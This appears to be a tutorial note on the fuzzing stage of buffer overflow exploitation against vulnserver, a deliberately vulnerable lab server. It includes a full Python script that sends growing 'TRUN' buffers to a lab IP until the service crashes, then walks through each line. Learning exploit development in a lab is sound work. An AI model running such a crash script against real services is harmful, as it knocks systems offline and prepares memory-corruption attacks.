- In theory fuzzing is almost the same as spiking, except in spiking we attacked all the commands to check which one is vulnerable, but in fuzzing we attack the vulnerable command alone.
- So now perform the same steps you performed to get vulnserver attached and running in immunity debugger
- Once you've done that, let's make a script that we'll be using to perform fuzzing
- Name the script fuzz1.py and add the following in it

	```
```#!/usr/bin/python3
	import sys, socket 
	from time import sleep
	
	buffer  = "A" * 100
	
	while True:
	        try:
	                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	                s.connect(('172.18.176.193',9999))
	                payload = "TRUN /.:/" + buffer
	                s.send((payload.encode()))
	                s.close()
	                sleep(1)
	                buffer = buffer + "A" * 100
	                
	        except:
	                print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
	                sys.exit()
```

- Starting off from the top, we're just declaring that this is a python script and importing some modules
- We're declaring a buffer variables that contains 100 A's
- And inside the while loop that runs for true condition we're specifying the ip address and the port number to connect to.
- Once we do that we're going to send the trun command with 100 A's
- If you remember looking at the vulnerable trun command register in immunity, there were these characters `/.:/`. This was incorporated so that the program can understand it.
- We're using encoding so that python does byte encoding to send these characters.
- Once that's done the connection closes and sleeps for a second.
- Following that, we appended 100 A's to buffer again.
- So as long as there's a connection we're going to keep sending the buffer that keeps getting bigger and bigger.
- So once we fuzz it, it will print the specific byte at which broke.
- That's why we're giving the exception that says fuzzing crashed at x bytes.
- save the file and change the perm by typing `chmod +x <filename>`
- Establish the connection by typing `python3 fuzz1.py`
- We see that the server crashed and can see the register output once immunity pauses.
- Next up we'll determine what the EIP value is and where does it correspond in specific number of bytes we send over.
